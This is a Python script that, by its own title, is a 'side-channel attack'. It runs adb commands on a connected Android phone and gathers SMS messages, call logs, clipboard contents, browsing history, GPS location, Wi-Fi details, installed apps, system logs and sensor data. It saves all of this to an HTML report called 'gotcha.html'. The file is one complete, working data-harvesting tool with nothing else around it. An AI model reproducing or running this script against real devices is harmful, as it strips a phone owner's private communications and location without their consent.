import subprocess

def adb_command(command):
    """Helper function to run adb commands and return output."""
    try:
        result = subprocess.run(f"adb shell {command}", shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return result.stdout.decode('utf-8').strip()
    except subprocess.CalledProcessError as e:
        print(f"Error executing command: {e}")
        return "Command failed or unsupported."

def get_clipboard_data():
    """Retrieve clipboard contents."""
    return adb_command("dumpsys clipboard | grep 'data='")

def get_last_wakeup_time():
    """Retrieve last wakeup time."""
    return adb_command("dumpsys power | grep 'mLastWakeTime'")

def get_browsing_history():
    """Retrieve browsing history."""
    return adb_command('content query --uri content://browser/bookmarks --projection title,url --where "bookmark=0"')

def get_wifi_info():
    """Retrieve Wi-Fi connection info."""
    return adb_command('dumpsys wifi | grep "mWifiInfo"')

def get_installed_apps():
    """Retrieve list of installed apps."""
    return adb_command("pm list packages -f")

def get_battery_stats():
    """Retrieve battery stats."""
    return adb_command("dumpsys batterystats")

def get_call_logs():
    """Retrieve call logs."""
    return adb_command('content query --uri content://call_log/calls --projection number,type,date,duration')

def get_sms_messages():
    """Retrieve SMS messages."""
    return adb_command('content query --uri content://sms/ --projection address,body,date')

def get_foreground_apps():
    """Retrieve currently foreground apps."""
    return adb_command('dumpsys usagestats')

def get_device_logs():
    """Retrieve system logs."""
    return adb_command('logcat -d')

def get_location_data():
    """Retrieve GPS location info."""
    return adb_command('dumpsys location')

def get_sensor_data():
    """Retrieve sensor data (e.g., accelerometer, gyroscope)."""
    return adb_command('dumpsys sensorservice')

def create_html_report(clipboard, wakeup_time, browsing_history, wifi_info, installed_apps, battery_stats, call_logs, sms_messages, foreground_apps, device_logs, location_data, sensor_data):
    """Generate and save the HTML report."""
    html_content = f"""
    <html>
    <head>
        <title>Side-Channel Attack Report - Created by N Vishnu Venkatesh</title>
        <style>
            body {{
                background-color: black;
                color: lime;
                font-family: 'Courier New', Courier, monospace;
                text-align: center;
            }}
            h1 {{
                font-size: 3em;
                text-shadow: 2px 2px #FF0000;
            }}
            .banner {{
                background-color: #000;
                color: #0F0;
                border: 2px solid lime;
                padding: 10px;
                margin: 20px auto;
                width: 80%;
            }}
            .section {{
                margin: 20px;
                padding: 20px;
                border: 2px solid #0F0;
                box-shadow: 0 0 10px lime;
                width: 80%;
                margin-left: auto;
                margin-right: auto;
                background-color: rgba(0, 255, 0, 0.1);
            }}
            pre {{
                text-align: left;
                margin: 20px;
                padding: 10px;
                background-color: black;
                color: #0F0;
                font-size: 1.2em;
                border: 1px solid #0F0;
                overflow: auto;
            }}
        </style>
    </head>
    <body>
        <div class="banner">
            <h1>Created by N Vishnu Venkatesh - Cyber Forensic Expert</h1>
        </div>
        <div class="section">
            <h2>Clipboard Data</h2>
            <pre>{clipboard}</pre>
        </div>
        <div class="section">
            <h2>Last Wakeup Time</h2>
            <pre>{wakeup_time}</pre>
        </div>
        <div class="section">
            <h2>Browsing History</h2>
            <pre>{browsing_history}</pre>
        </div>
        <div class="section">
            <h2>Wi-Fi Info</h2>
            <pre>{wifi_info}</pre>
        </div>
        <div class="section">
            <h2>Installed Apps</h2>
            <pre>{installed_apps}</pre>
        </div>
        <div class="section">
            <h2>Battery Stats</h2>
            <pre>{battery_stats}</pre>
        </div>
        <div class="section">
            <h2>Call Logs</h2>
            <pre>{call_logs}</pre>
        </div>
        <div class="section">
            <h2>SMS Messages</h2>
            <pre>{sms_messages}</pre>
        </div>
        <div class="section">
            <h2>Foreground Apps</h2>
            <pre>{foreground_apps}</pre>
        </div>
        <div class="section">
            <h2>Device Logs</h2>
            <pre>{device_logs}</pre>
        </div>
        <div class="section">
            <h2>GPS Location Data</h2>
            <pre>{location_data}</pre>
        </div>
        <div class="section">
            <h2>Sensor Data</h2>
            <pre>{sensor_data}</pre>
        </div>
    </body>
    </html>
    """
    
    # Save the report using UTF-8 encoding to avoid Unicode issues
    with open("gotcha.html", "w", encoding="utf-8") as file:
        file.write(html_content)

    print("HTML report saved as gotcha.html")

def main():
    print("Starting Side-Channel Attack...")

    # Collect data with failure handling
    clipboard = get_clipboard_data()
    wakeup_time = get_last_wakeup_time()
    browsing_history = get_browsing_history()
    wifi_info = get_wifi_info()
    installed_apps = get_installed_apps()
    battery_stats = get_battery_stats()
    call_logs = get_call_logs()
    sms_messages = get_sms_messages()
    foreground_apps = get_foreground_apps()
    device_logs = get_device_logs()
    location_data = get_location_data()
    sensor_data = get_sensor_data()

    # Create HTML report
    create_html_report(
        clipboard, wakeup_time, browsing_history, wifi_info, installed_apps,
        battery_stats, call_logs, sms_messages, foreground_apps, device_logs,
        location_data, sensor_data
    )

    print("Attack Completed.")

if __name__ == "__main__":
    main()

